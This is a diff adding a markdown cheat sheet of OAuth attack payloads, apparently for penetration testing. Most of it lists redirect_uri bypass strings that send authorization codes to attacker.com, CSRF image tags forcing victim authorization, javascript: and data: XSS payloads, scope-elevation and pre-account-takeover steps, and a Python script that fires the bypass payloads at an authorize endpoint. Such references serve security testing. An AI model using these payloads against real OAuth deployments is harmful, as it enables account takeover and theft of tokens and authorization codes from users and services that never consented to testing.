@@ -1,0 +1,373 @@
+# OAuth Vulnerabilities Payloads
+
+## ========================================
+## REDIRECT_URI MANIPULATION
+## ========================================
+
+# Open redirect
+?redirect_uri=http://attacker.com
+?redirect_uri=http://target.com@attacker.com
+?redirect_uri=http://target.com.attacker.com
+
+# Path traversal
+?redirect_uri=http://target.com/../attacker.com
+?redirect_uri=http://target.com/..%2f..%2fattacker.com
+
+# Subdomain takeover
+?redirect_uri=http://old.target.com (if vulnerable)
+
+# URL encoding
+?redirect_uri=http%3A%2F%2Fattacker.com
+
+## ========================================
+## AUTHORIZATION CODE THEFT
+## ========================================
+
+# Steal authorization code
+1. Victim authorizes app
+2. Redirect to attacker-controlled redirect_uri
+3. Code leaked in URL
+
+# Referer leakage
+Authorization code in Referer header
+
+## ========================================
+## STATE PARAMETER
+## ========================================
+
+# Missing state
+Remove state parameter
+No CSRF protection
+
+# Predictable state
+state=123456
+state=md5(timestamp)
+
+# State fixation
+Set victim's state to known value
+
+## ========================================
+## IMPLICIT GRANT ATTACKS
+## ========================================
+
+# Token theft
+?response_type=token
+Token in URL fragment
+
+# Access token in Referer
+Token leaked via Referer header
+
+## ========================================
+## SCOPE MANIPULATION
+## ========================================
+
+# Request elevated scope
+?scope=read+write+admin
+?scope=profile+email+delete
+
+# Scope upgrade
+Request read, get write
+
+## ========================================
+## CLIENT AUTHENTICATION
+## ========================================
+
+# Missing client authentication
+client_id without client_secret
+
+# Weak client_secret
+Hardcoded in mobile app
+Easily extracted
+
+## ========================================
+## TOKEN LEAKAGE
+## ========================================
+
+# Referer leakage
+Access token in URL → Referer header
+
+# Logs
+Tokens in server logs
+
+# Browser history
+Tokens in browser history
+
+## ========================================
+## CSRF ON OAUTH FLOW
+## ========================================
+
+# Force victim to authorize
+<img src="https://oauth.provider.com/authorize?client_id=X&redirect_uri=Y&response_type=code&state=attacker_controlled">
+
+## ========================================
+## AUTHORIZATION CODE REUSE
+## ========================================
+
+# Reuse authorization code
+code=abc123
+Use same code multiple times
+
+## ========================================
+## CLIENT IMPERSONATION
+## ========================================
+
+# Use victim's client_id
+?client_id=victim_app_id
+?redirect_uri=attacker.com
+
+## ========================================
+## OPEN REDIRECT VIA OAUTH
+## ========================================
+
+# Via redirect_uri
+?redirect_uri=javascript:alert(1)
+?redirect_uri=data:text/html,<script>alert(1)</script>
+
+## ========================================
+## ACCOUNT LINKING EXPLOIT
+## ========================================
+
+# Force link to attacker account
+1. Start OAuth flow
+2. Get victim to complete
+3. Victim's account links to attacker's OAuth
+
+## ========================================
+## PRE-ACCOUNT TAKEOVER
+## ========================================
+
+# Register with victim's OAuth email
+1. Create account with email@victim.com
+2. Victim tries to register via OAuth
+3. OAuth links to attacker's account
+
+## ========================================
+## EXPLOITATION EXAMPLES
+## ========================================
+
+# Example 1: Authorization code theft
+https://oauth.provider.com/authorize?
+  client_id=CLIENT_ID&
+  redirect_uri=http://attacker.com&
+  response_type=code&
+  scope=profile+email
+
+# Example 2: CSRF
+<img src="https://oauth.provider.com/authorize?
+  client_id=CLIENT_ID&
+  redirect_uri=http://attacker.com/callback&
+  response_type=code&
+  scope=read_messages">
+
+## ========================================
+## RESPONSE TYPE CONFUSION
+## ========================================
+
+# Mix response types
+?response_type=code+token
+?response_type=token (when expecting code)
+
+## ========================================
+## PKCE BYPASS
+## ========================================
+
+# Missing PKCE
+Authorization without code_challenge
+
+# Weak code_verifier
+Short or predictable verifier
+
+## ========================================
+## REFRESH TOKEN ABUSE
+## ========================================
+
+# Long-lived refresh tokens
+No expiration
+
+# Token not rotated
+Same refresh token reused
+
+# No binding to client
+Stolen token works anywhere
+
+## ========================================
+## COMMON MISCONFIGURATIONS
+## ========================================
+
+# Wildcard redirect_uri
+redirect_uri=http://*.target.com
+
+# Regex bypass
+Validation: /^https:\/\/target\.com/
+Bypass: https://target.com.attacker.com
+
+# Open redirect_uri
+Any URL accepted
+
+## ========================================
+## OAUTH PROVIDER FLAWS
+## ========================================
+
+# Google OAuth
+?redirect_uri=https://accounts.google.com/...
+
+# Facebook OAuth
+?redirect_uri=https://www.facebook.com/connect/...
+
+# GitHub OAuth
+?redirect_uri=https://github.com/...
+
+## ========================================
+## TESTING METHODOLOGY
+## ========================================
+
+# 1. Test redirect_uri
+- Try attacker domain
+- Try open redirects
+- Try subdomain takeover
+
+# 2. Test state parameter
+- Remove it
+- Reuse values
+- Test predictability
+
+# 3. Test authorization code
+- Try reuse
+- Check expiration
+- Test binding
+
+# 4. Test scope
+- Request elevated scopes
+- Test scope upgrade
+
+# 5. Test token handling
+- Check for leakage
+- Test token binding
+
+## ========================================
+## MOBILE APP OAUTH
+## ========================================
+
+# Intercept redirect
+Custom URL scheme: myapp://callback
+
+# Steal via malicious app
+Register same URL scheme
+
+## ========================================
+## RACE CONDITIONS
+## ========================================
+
+# Parallel authorization
+Use code in multiple requests simultaneously
+
+## ========================================
+## JWT IN OAUTH
+## ========================================
+
+# JWT as access token
+?alg=none
+HS256 to RS256 confusion
+
+## ========================================
+## TOOLS
+## ========================================
+
+# Burp Suite
+- OAuth extension
+- Manual testing in Repeater
+
+# OAuth.tools
+Online OAuth testing
+
+# Postman
+Test OAuth flows
+
+## ========================================
+## COMMON ENDPOINTS
+## ========================================
+
+/oauth/authorize
+/oauth/token
+/oauth/callback
+/connect/authorize
+/connect/token
+/api/oauth/authorize
+
+## ========================================
+## PAYLOAD VARIATIONS
+## ========================================
+
+# redirect_uri bypasses
+http://target.com@attacker.com
+http://target.com.attacker.com
+http://target.com%00.attacker.com
+http://target.com/..//attacker.com
+http://target.com\.attacker.com
+http://target.com#attacker.com
+http://attacker.com?target.com
+
+## ========================================
+## ACCOUNT TAKEOVER FLOW
+## ========================================
+
+# Via OAuth
+1. Create account with victim's email
+2. Don't verify email
+3. Victim uses OAuth with same email
+4. OAuth links to attacker's account
+5. Attacker controls victim's account
+
+## ========================================
+## COVERT REDIRECT
+## ========================================
+
+# Chain redirects
+redirect_uri=http://target.com/redirect?url=http://attacker.com
+
+## ========================================
+## OAUTH 1.0 SPECIFIC
+## ========================================
+
+# Session fixation
+oauth_token fixation
+
+# Signature bypass
+Remove oauth_signature
+
+## ========================================
+## REAL-WORLD VULNERABILITIES
+## ========================================
+
+# Facebook
+Redirect_uri bypass via open redirect
+
+# Google
+Account linking exploit
+
+# GitHub
+Scope upgrade vulnerability
+
+## ========================================
+## AUTOMATED TESTING
+## ========================================
+
+# Test script
+import requests
+
+auth_url = "https://oauth.provider.com/authorize"
+
+payloads = [
+    "http://attacker.com",
+    "http://target.com@attacker.com",
+    "javascript:alert(1)"
+]
+
+for payload in payloads:
+    params = {
+        "client_id": "CLIENT_ID",
+        "redirect_uri": payload,
+        "response_type": "code"
+    }
+    r = requests.get(auth_url, params=params)
+    # Check if redirect accepted
